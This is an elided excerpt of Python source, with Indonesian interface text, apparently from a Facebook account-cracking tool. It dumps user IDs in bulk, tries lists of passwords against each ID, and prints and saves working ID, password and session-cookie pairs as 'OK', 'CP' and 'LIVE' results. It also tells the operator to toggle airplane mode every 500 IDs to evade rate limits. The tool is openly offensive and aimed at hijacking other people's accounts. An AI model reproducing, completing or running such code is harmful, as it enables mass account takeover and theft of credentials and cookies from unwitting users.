...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t                SELAMAT : [green]DATANG[purple]'))
...
def dump_massal():
	...
	try:
		print('')
		print(f'\n👿 {u}ID YANG TERKUMPUL 👿{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def passwrd():
	...
	print('')
	print(f'\n👿{h} HASIL {sir}{h}OK{h} TERSIMPAN DI : {h}OK/%s {x}'%(okc))
	print(f'👿{k} HASIL {sir}{k}CP{k} TERSIMPAN DI : {k}CP/%s {x}'%(cpc))
	print(f'👿{k} AKTIFKAN MODE PESAWAT SETIAP {h}500{k} ID...........')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'{sir}{h}HASIL CHECKPOINT') 
				print(f'\r{x}ID : {k} {idf} \t  {x} \nPASSWORD : {h} {pw}{N}')     
				...
				if 'no' in taplikasi:
					...
					print(f'{sir}{k}HASIL LIVE ') 
					print(f'\r{x}ID : {H}{idf}\t {x} \nPASSWORD : {h}{pw}    \nCOOKIE : {kuki}{N}')
